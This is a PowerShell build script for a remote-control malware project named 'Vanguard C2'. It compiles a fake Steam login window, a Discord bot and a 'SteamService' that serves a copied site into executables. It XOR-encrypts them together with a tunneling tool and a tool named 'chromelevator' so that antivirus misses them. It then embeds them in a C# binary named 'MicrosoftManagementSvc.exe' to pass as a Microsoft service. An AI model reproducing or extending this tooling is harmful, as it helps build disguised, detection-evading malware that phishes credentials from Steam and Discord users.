# Vanguard C2 Full Rebuild Script
$ErrorActionPreference = "Stop"

Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
try { Stop-Process -Name "MicrosoftManagementSvc" -Force -ErrorAction SilentlyContinue } catch {}
try { Stop-Process -Name "python" -Force -ErrorAction SilentlyContinue } catch {}

# Clear old artifacts
Remove-Item -Path "dist", "build", "SteamLogin.spec", "discord_bot.spec" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data "login\steam_ui.html;." --add-data "login\steam.ico;." --add-data "login\logo.png;." --add-data "login\image.png;." --collect-all webview --collect-all cryptography --noupx --name "SteamLogin" "login\main_ui.py"
pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --noupx --name "discord_bot" "websocket\discord_bot.py"
pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data "okoshko\site_dump;site_dump" --add-data "login\steam.ico;." --noupx --name "SteamService" "okoshko\steam_notice.py"

Write-Host "[*] Phase 3: Binary Encryption (Dynamic XOR)..." -ForegroundColor Cyan
$XorKey = Get-Random -Minimum 1 -Maximum 254
Write-Host "    [+] Generated dynamic XOR key: 0x$($XorKey.ToString('X2'))" -ForegroundColor Green

$ConstantsPath = "defense\Constants.cs"
$Content = Get-Content $ConstantsPath
$NewContent = $Content -replace 'public const byte RESOURCE_XOR_KEY = 0x[0-9A-F]{2};', "public const byte RESOURCE_XOR_KEY = 0x$($XorKey.ToString('X2'));"
Set-Content $ConstantsPath $NewContent

function Invoke-XorEncryption {
    param([string]$FilePath, [byte]$Key)
    $Bytes = [System.IO.File]::ReadAllBytes($FilePath)
    for ($i = 0; $i -lt $Bytes.Count; $i++) { $Bytes[$i] = $Bytes[$i] -bxor $Key }
    [System.IO.File]::WriteAllBytes($FilePath, $Bytes)
}

$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\discord_bot.exe", "dist\SteamService.exe", "tools\bore.exe", "tools\chromelevator.exe")
foreach ($file in $FilesToEncrypt) {
    if (Test-Path $file) {
        $binFile = $file -replace "\.exe", ".bin"
        Move-Item -Path $file -Destination $binFile -Force
        Invoke-XorEncryption -FilePath $binFile -Key $XorKey
        Write-Host "    [+] Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
        
        # Sync to root for C# embedding
        $rootBin = Join-Path $PSScriptRoot (Split-Path $binFile -Leaf)
        Copy-Item -Path $binFile -Destination $rootBin -Force
        Write-Host "    [+] Synced to root: $(Split-Path $rootBin -Leaf)" -ForegroundColor Gray
    }
}

Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan
dotnet publish -c Release -r win-x64 -p:PublishAot=true --nologo

if ($LASTEXITCODE -eq 0) {
    $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
    $FinalExe = Join-Path $PublishDir "MicrosoftManagementSvc.exe"
    
    if (Test-Path "GlobalLogger.py") {
        Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
    }

    if (Test-Path "tools\bore.bin") {
        $ToolsDest = Join-Path $PublishDir "tools"
        New-Item -ItemType Directory -Path $ToolsDest -ErrorAction SilentlyContinue
        Copy-Item -Path "tools\bore.bin" -Destination $ToolsDest -Force
    }

    Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
    Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
} else {
    Write-Error "C# Build FAILED!"
}
